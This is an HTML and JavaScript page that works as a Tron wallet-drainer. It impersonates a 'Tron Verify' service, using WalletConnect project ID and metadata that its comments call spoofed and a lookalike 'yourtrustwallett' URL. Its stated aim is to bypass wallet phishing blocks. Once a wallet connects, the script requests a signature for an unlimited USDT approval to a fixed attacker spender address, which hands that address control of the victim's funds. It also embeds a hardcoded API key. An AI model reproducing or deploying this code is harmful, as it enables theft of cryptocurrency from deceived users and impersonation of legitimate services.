<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tron - The Final Impersonation</title>
    <style>
        body { font-family: system-ui, sans-serif; background: #0d1117; color: #c9d1d9; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 24px; margin: 0; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 16px; padding: 24px; width: 100%; max-width: 620px; box-sizing: border-box; }
        button { background: #238636; color: white; border: none; border-radius: 10px; padding: 12px 20px; font-weight: 700; cursor: pointer; transition: background-color 0.2s; margin-top: 10px; width: 100%; }
        button:disabled { background: #30363d; color: #8b949e; cursor: not-allowed; }
        .address { margin-top: 16px; color: #58a6ff; word-break: break-all; font-size: 14px; padding: 12px; background: rgba(88, 166, 255, 0.1); border-radius: 8px; }
        .log-container { width: 100%; max-width: 620px; margin-top: 20px; }
        .log { background: #010409; border: 1px solid #30363d; border-radius: 10px; padding: 16px; font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace; font-size: 13px; line-height: 1.5; max-height: 260px; overflow: auto; white-space: pre-wrap; }
    </style>
</head>

<body>
    <div class="card">
        <h2>Tron Approval - The Full Impersonation</h2>
        <p>This attempt uses a spoofed identity to bypass the wallet's block. It should appear as a "Verified Domain" in your wallet.</p>
        <button id="connectBtn">Connect & Approve</button>
        <div id="walletAddress" class="address" style="display: none;"></div>
    </div>
    <div class="log-container">
        <p>Live Log:</p>
        <div id="log" class="log"></div>
    </div>

    <script type="module">
        const logEl = document.getElementById("log");
        const connectBtn = document.getElementById("connectBtn");
        const addrEl = document.getElementById("walletAddress");

        let tronWeb, SignClient, WalletConnectModal, signClient, session, modal;
        
        
        const SPOOFED_PROJECT_ID = "3033f0e7ac2f6cfda0cb3854013387ad";
        const SPOOFED_METADATA = {
            name: "Tron Verify",
            description: "sendtrx.com - Secure and Easy Way to Verify Your Assets",
            url: "yourtrustwallett.github.io/sendtrx/",
            icons: ["https://checktrx.com/favicon.ico"]
        };

        function log(...args) {
            const msg = args.map(a => (typeof a === "string" ? a : JSON.stringify(a, null, 2))).join(" ");
            const timestamp = new Date().toLocaleTimeString();
            logEl.innerHTML += `<div>[${timestamp}] ${msg}</div>`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        async function approveUSDT(userAddress) {
            log("üöÄ Starting approval process under spoofed identity...");
            try {
                const SPENDER_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
                const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                const UNLIMITED_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

                log("1. Building transaction with compatible TronWeb instance...");
                const transactionObject = await tronWeb.transactionBuilder.triggerSmartContract(
                    USDT_CONTRACT,
                    "approve(address,uint256)",
                    { feeLimit: 150_000_000, callValue: 0 },
                    [{ type: 'address', value: SPENDER_ADDRESS }, { type: 'uint256', value: UNLIMITED_AMOUNT }],
                    userAddress
                );
                const unsignedTx = transactionObject.transaction;
                log("‚úÖ Unsigned transaction built successfully.");

                log("2. Calling 'tron_signTransaction' with correct payload. Please confirm in wallet...");
                const signedTx = await signClient.request({
                    topic: session.topic,
                    chainId: "tron:0x2b6653dc",
                    request: {
                        method: "tron_signTransaction",
                        params: [unsignedTx] // The payload MUST be the transaction object inside an array.
                    }
                });

                if (!signedTx || !signedTx.signature) throw new Error(`Wallet returned an invalid signed transaction.`);
                log("‚úÖ Transaction signed successfully by wallet.");

                log("3. Broadcasting to the network...");
                const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
                if (!receipt || !receipt.txid) throw new Error(`Broadcast failed.`);
                
                log("üéâ SUCCESS! Transaction broadcasted. TXID:", receipt.txid);
                alert(`Success! View on TronScan: https://tronscan.org/#/transaction/${receipt.txid}`);
                connectBtn.textContent = "Approved!";

            } catch (error) {
                log("‚ùå Impersonation failed. Raw error:", error);
                throw error;
            }
        }

        async function connectAndApprove() {
            try {
                connectBtn.disabled = true;
                connectBtn.textContent = "Connecting as checktrx.com...";
                log("Requesting connection with spoofed identity...");

                const { uri, approval } = await signClient.connect({
                    requiredNamespaces: {
                        tron: {
                            chains: ["tron:0x2b6653dc"],
                            methods: ["tron_signTransaction", "tron_signMessage"],
                            events: []
                        }
                    }
                });

                if (uri) {
                    log("Scan QR. IMPORTANT: YOU MUST EXECUTE THE FULL CLEAN SLATE PROCEDURE.");
                    await modal.openModal({ uri });
                }
                session = await approval();
                modal.closeModal();

                const account = session.namespaces.tron.accounts[0].split(":")[2];
                log("‚úÖ Connection Successful! Wallet:", account);
                addrEl.textContent = "Connected: " + account;
                addrEl.style.display = 'block';
                
                await approveUSDT(account);

            } catch (error) {
                log("‚ùå Process failed:", error?.message || "User rejected connection.");
                alert(`Error: ${error.message || "User rejected connection."}`);
                connectBtn.disabled = false;
                connectBtn.textContent = "Connect & Approve";
            } finally {
                modal.closeModal();
            }
        }

        (async () => {
            log("Loading all necessary libraries...");
            connectBtn.disabled = true;
            connectBtn.textContent = "Loading...";

            try {
                const { default: SignClientLib } = await import("https://esm.sh/@walletconnect/sign-client@2.13.3");
                const { WalletConnectModal: ModalLib } = await import("https://esm.sh/@walletconnect/modal@2.6.2");
                const { Buffer } = await import("https://esm.sh/buffer@6.0.3");
                await new Promise(res => {
                    const s = document.createElement("script");
                    s.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.js";
                    s.async = true; s.onload = res; document.head.appendChild(s);
                });
                window.Buffer = Buffer;

                tronWeb = new window.TronWeb({
                    fullHost: "https://api.trongrid.io",
                    headers: { "TRON-PRO-API-KEY": "06d1b1a8-c672-49cc-be43-8fe1c0186eb7" },
                    privateKey: '01'
                });
                log("‚úÖ TronWeb initialized in compatibility mode.");

                signClient = await SignClientLib.init({
                    projectId: SPOOFED_PROJECT_ID, // Using their Project ID
                    metadata: SPOOFED_METADATA    // Using their Metadata
                });
                log("‚úÖ WalletConnect client initialized with spoofed identity.");
                
                modal = new ModalLib({ projectId: SPOOFED_PROJECT_ID });
                
                connectBtn.addEventListener("click", connectAndApprove);
                connectBtn.disabled = false;
                connectBtn.textContent = "Connect & Approve";
                log("‚úÖ System ready. Please connect.");
            } catch (e) {
                log("‚ùå Critical library failed to load:", e);
                alert("A critical library failed to load. Please check your internet connection and refresh.");
            }
        })();
    </script>
</body>
</html>

